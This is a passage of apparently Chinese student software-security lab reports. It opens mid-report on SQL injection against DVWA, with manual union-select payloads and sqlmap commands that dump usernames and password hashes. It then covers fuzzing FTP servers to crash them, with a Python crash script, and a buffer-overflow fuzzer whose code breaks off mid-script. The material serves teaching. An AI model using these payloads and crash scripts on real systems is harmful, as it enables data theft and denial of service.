alt="1565862325209"></p></li><li><p>选择其中的<code>users</code>表，输入``1’<code></code>union select 1,column_name from information_schema.columns where table_name=’users’–<code>，查询</code>user`表的字段名</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862367139.png" alt="1565862367139"></p></li><li><p>只需要得到用户名和密码，因此输入``1’ union select user,password from users–` ，结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862400235.png" alt="1565862400235"></p><p>其中密码是<code>md5</code>加密，可以使用解码网站解密，如<code>5f4dcc3b5aa765d61d8327deb882cf99</code>解密后为<code>password</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862422877.png" alt="1565862422877"></p></li></ol><h3 id="安全级别中级"><a href="#安全级别中级" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol><li><p>进行安全级别设置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p></li><li><p>尝试输入<code>1’ or ‘1’=’1</code>，发现报错信息，可以发现安全级别为中级时，对字符进行转义处理</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863258617.png" alt="1565863258617"></p></li><li><p>尝试数字型注入，输入<code>1 or 1=1</code>，成功查询到所有的数据</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863306258.png" alt="1565863306258"></p></li><li><p>与低级类似，输入<code>1 union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863334915.png" alt="1565863334915"></p></li><li><p>同样，输入<code>1 union select user,password from users--</code> ，得到用户名和密码，其中密码是<code>md5</code>加密，可以使用解码网站解密</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863362085.png" alt="1565863362085"></p></li></ol><h2 id="SQLMAP工具注入"><a href="#SQLMAP工具注入" class="headerlink" title="SQLMAP工具注入"></a><code>SQLMAP</code>工具注入</h2><h3 id="安全级别低级-1"><a href="#安全级别低级-1" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol><li><p>进行安全级别设置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p></li><li><p>输入<code>id</code>为<code>1</code>，使用<code>URL</code>在<code>SQLMAP</code>中尝试：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>发现跳转到登陆界面，需要加上<code>cookie</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862650413.png" alt="1565862650413"></p></li><li><p>在浏览器中查看<code>cookie</code>并记录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862664106.png" alt="1565862664106"></p></li><li><p>在<code>SQLMAP</code>目标<code>URL</code>带上<code>cookie</code>重新尝试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104"</span></span><br></pre></td></tr></table></figure><p>注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862750086.png" alt="1565862750086"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862761063.png" alt="1565862761063"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> --dbs</span><br></pre></td></tr></table></figure><p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862837386.png" alt="1565862837386"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862843842.png" alt="1565862843842"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa –tables</span><br></pre></td></tr></table></figure><p>选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862931713.png" alt="1565862931713"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862940712.png" alt="1565862940712"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure><p>选择<code>users</code>表，查看表中的列</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863006027.png" alt="1565863006027"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863010978.png" alt="1565863010978"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure><p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863074071.png" alt="1565863074071"></p></li></ol><h3 id="安全级别中级-1"><a href="#安全级别中级-1" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol><li><p>进行安全级别设置</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p></li><li><p>在SQLMAP目标url带上cookie重新尝试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104"</span></span><br></pre></td></tr></table></figure><p>注入成功</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863427938.png" alt="1565863427938"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863433020.png" alt="1565863433020"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> --dbs</span><br></pre></td></tr></table></figure><p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863487711.png" alt="1565863487711"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863498957.png" alt="1565863498957"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/ vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa --tables</span><br></pre></td></tr></table></figure><p> 选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863540630.png" alt="1565863540630"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863544746.png" alt="1565863544746"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -<span class="string">u"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure><p>选择<code>users</code>表，查看表中的列</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863584752.png" alt="1565863584752"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863588715.png" alt="1565863588715"></p></li><li><p>在命令行中输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104"</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure><p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863634151.png" alt="1565863634151"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘与模糊测试 实验报告</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>了解<code>fuzz</code>的基本原理；</li><li>通过<code>FtpFuzz</code>来<code>fuzz easy ftp server</code>的服务器，使服务器停止工作；</li><li>自己编写或修改<code>Python</code>脚本来自己编写<code>FTP FUZZ</code>简单工具，并用其来对<code>Home Ftp Server</code>进行<code>Fuzz</code>,使服务器停止工作，可以用<code>OllyDbg</code>附加查看异常。 <a id="more"></a></li></ol><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><table><thead><tr><th align="center">软件</th><th align="center">版本</th></tr></thead><tbody><tr><td align="center">服务器端</td><td align="center">Win 2000</td></tr><tr><td align="center">客户端</td><td align="center">Win 2000</td></tr><tr><td align="center"><code>Quick Easy Ftp Server</code></td><td align="center">3.1 Lite</td></tr><tr><td align="center"><code>Infigo FTPStress Fuzzer</code></td><td align="center">V1.0</td></tr><tr><td align="center"><code>Home Ftp Server</code></td><td align="center">1.10.1</td></tr></tbody></table><h1 id="通过FtpFuzz来fuzz-easy-ftp-server的服务器，使服务器停止工作"><a href="#通过FtpFuzz来fuzz-easy-ftp-server的服务器，使服务器停止工作" class="headerlink" title="通过FtpFuzz来fuzz easy ftp server的服务器，使服务器停止工作"></a>通过<code>FtpFuzz</code>来<code>fuzz easy ftp server</code>的服务器，使服务器停止工作</h1><ol><li><p>使用<code>Quick’n Easy FTP server</code>搭建服务器，开放匿名用户</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854306571.png" alt="1565854306571"></p></li><li><p>设置<code>FTP</code>的目录</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854387309.png" alt="1565854387309"></p></li><li><p>开放<code>Download</code>权限，并启动服务器</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854408500.png" alt="1565854408500"></p></li><li><p>打开<code>ftpfuzz</code>的<code>exe</code>文件，进行服务器的<code>FUZZ</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854432527.png" alt="1565854432527"></p></li><li><p>左下角下拉框选择<code>Deselect All</code>，然后在<code>USER</code>选项和<code>PASS</code>选项中的<code>Command Argument</code>中填入<code>anonymous</code>，在LIST选项中选中<code>fuzz this ftp command</code>选项</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854595402.png" alt="1565854595402"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854601231.png" alt="1565854601231"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854607650.png" alt="1565854607650"></p></li><li><p>点击<code>config</code>菜单，在<code>Fuzzing data</code>中设定要设置的脏数据</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854685778.png" alt="1565854685778"></p></li><li><p>设置<code>FTP</code>主机的<code>IP</code>地址，点击<code>start</code>开始<code>fuzz</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854760808.png" alt="1565854760808"></p></li><li><p>启动<code>fuzzer</code>后可以观察到相关的信息</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854812857.png" alt="1565854812857"></p></li><li><p>红字的部分说明了已经<code>fuzz</code>成功，<code>FTP</code>服务器因脏数据而崩溃</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854830715.png" alt="1565854830715"></p></li><li><p>打开<code>FTP</code>主机的情况，发现的确崩溃，<code>fuzz</code>生效</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854863418.png" alt="1565854863418"></p></li></ol><h1 id="编写或修改Python脚本来自己编写FTP-FUZZ简单工具，并用其来对Home-Ftp-Server进行Fuzz-使服务器停止工作"><a href="#编写或修改Python脚本来自己编写FTP-FUZZ简单工具，并用其来对Home-Ftp-Server进行Fuzz-使服务器停止工作" class="headerlink" title="编写或修改Python脚本来自己编写FTP FUZZ简单工具，并用其来对Home Ftp Server进行Fuzz,使服务器停止工作"></a>编写或修改<code>Python</code>脚本来自己编写<code>FTP FUZZ</code>简单工具，并用其来对<code>Home Ftp Server</code>进行<code>Fuzz</code>,使服务器停止工作</h1><ol><li><p>打开<code>Home FTP Server</code>程序，点击<code>New Member</code>创建新成员，填入相关信息：<code>User name: Levi ; Password: root</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565854960261.png" alt="1565854960261"></p></li><li><p>启动<code>Home FTP Server</code>，在<code>URL</code>中输入：<code>ftp://10.122.237.117/</code>，并使用用户名和密码登录后显示如下，说明服务器正常运行</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855030266.png" alt="1565855030266"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855066435.png" alt="1565855066435"></p></li><li><p>编写<code>fuzz.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ftp</span><span class="params">(ip,port,user,passwd)</span>:</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)//建立socket连接</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connect=s.connect((ip,port))//连接主机</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Connected!'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Connected failed!'</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER %s\r\n'</span>%user)//发送用户名</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS %s\r\n'</span>%passwd)//发送密码</span><br><span class="line">    <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Sending payload..."</span></span><br><span class="line">    s.send(<span class="string">'site index '</span>+<span class="string">'a'</span>*<span class="number">272</span>*<span class="number">1</span>+<span class="string">'\r\n'</span>)//发送脏数据</span><br><span class="line">    s.send(<span class="string">'site index '</span>+<span class="string">'a'</span>*<span class="number">272</span>*<span class="number">2</span>+<span class="string">'\r\n'</span>)//发送脏数据(发送一次无法实现服务器崩溃)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'failed'</span>//出现异常说明可能出现了漏洞</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'succeed'</span></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ftp(<span class="string">'127.0.0.1'</span>,<span class="number">21</span>,<span class="string">'Levi'</span>,<span class="string">'root'</span>)</span><br></pre></td></tr></table></figure></li><li><p>运行<code>fuzz.py</code>脚本，查看运行结果，显示<code>failed</code>说明无法访问服务器，返回的数据是发送的脏数据</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855312803.png" alt="1565855312803"></p></li><li><p>查看服务器，发现服务器已经停止运行</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855329426.png" alt="1565855329426"></p></li><li><p>查看服务器日志，连续收到多次脏数据后直接退出</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855341850.png" alt="1565855341850"></p></li><li><p>将<code>HomeFtpServer.exe</code>放进<code>Ollydbg</code>中，重新执行<code>fuzz</code>程序，获得程序崩溃信息，跳转到<code>kernel32.77E99ED8</code>处时发生异常</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855374334.png" alt="1565855374334"></p></li></ol><h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        使用现成的<code>fuzz</code>攻击程序对目标主机进行<code>fuzz</code>攻击，可以使得FTP服务器崩溃；通过编写的<code>fuzz</code>源代码，也可以通过连接目标主机并发送脏数据包实现<code>fuzz</code>攻击，达到让目标服务器崩溃的效果，通过<code>ollydbg</code>分析该过程时，只能找到程序崩溃的位置，并没有找到程序崩溃的原因，虽然理论上是重复插入了相同的数据导致<code>FTP</code>服务器异常。</p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>开发一个针对文件溢出的目标程序的<code>fuzz</code>程序，使目标程序崩溃。要求生成攻击测试文件并通过程序自动加载，并确定从哪个文件开始出现程序崩溃，给出被攻击缓冲区实际大小，并植入一个<code>shellcode</code>（功能不限）</p><ol><li><p>使用<code>IDA</code>打开程序，反汇编得到反汇编代码，分析反汇编代码，发现<code>overflow_exe.exe</code>实现的功能是读取<code>password.txt</code>中的内容，与实现设定的正确密码<code>1234567</code>进行对比，若相同则输出<code>incorrect password!</code>，不同则输出<code>Congratulation! You have passed the verification!</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855659005.png" alt="1565855659005"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855664320.png" alt="1565855664320"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855669129.png" alt="1565855669129"></p></li><li><p>运行程序，验证步骤一</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855729470.png" alt="1565855729470"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565855764316.png" alt="1565855764316"></p></li><li><p>编写源代码，计算缓冲区大小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">rpwd = <span class="string">"Congratulation! You have passed the verification!\n"</span></span><br><span class="line">wpwd = <span class="string">"incorrect password!\n"</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*i*<span class="number">100</span>)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行大约%d次后崩溃!"</span>%(i*<span class="number">4</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*(i<span class="number">-1</span>)*<span class="number">100</span>+<span class="string">"aaaa"</span>*j*<span class="number">10</span>)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">j+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行大约%d次后崩溃!"</span>%((i<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">100</span>+j*<span class="number">4</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> t &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*(i<span class="number">-1</span>)*<span class="number">100</span>+<span class="string">"aaaa"</span>*(j<span class="number">-1</span>)*<span class="number">10</span>+<span class="string">"a"</span>*t)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">t+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行%d次后崩溃!"</span>%((i<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">100</span>+(j<span class="number">-1</span>)*<span class="number">4</span>*<span class="number">10</span>+t)</span><br></pre></td></tr></table></figure></li><li><p>运行脚本，得到缓冲区大小为<code>8197</code> </p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565856034118.png" alt="1565856034118"></p></li><li><p>构造<code>shellcode</code>，先输入<code>8200</code>个脏数据，构造<code>shellcode</code>后程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">rpwd = <span class="string">"Congratulation! You have passed the verification!\n"</span></span><br><span class="line">wpwd = <span class="string">"incorrect password!\n"</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*i*<span class="number">100</span>)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span class="string">""</span>.join(text)</span><br><span class="line"><span class="keyword">if</span> string == rpwd <span class="keyword">or</span> string == wpwd:</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"程序运行大约%d次后崩溃!"</span>%(i*<span class="number">4</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> j &lt; <span class="number">100</span>:</span><br><span class="line">fp = open(<span class="string">"password.txt"</span>,<span class="string">"w+"</span>)</span><br><span class="line">fp.write(<span class="string">"aaaa"</span>*(i<span class="number">-1</span>)*<span class="number">100</span>+<span class="string">"aaaa"</span>*j*<span class="number">10</span>)</span><br><span class="line">fp.close()</span><br><span class="line">p = os.popen(<span class="string">"overflow_exe.exe"</span>)</span><br><span class="line">text = p.readlines()</span><br><span class="line">string = <span 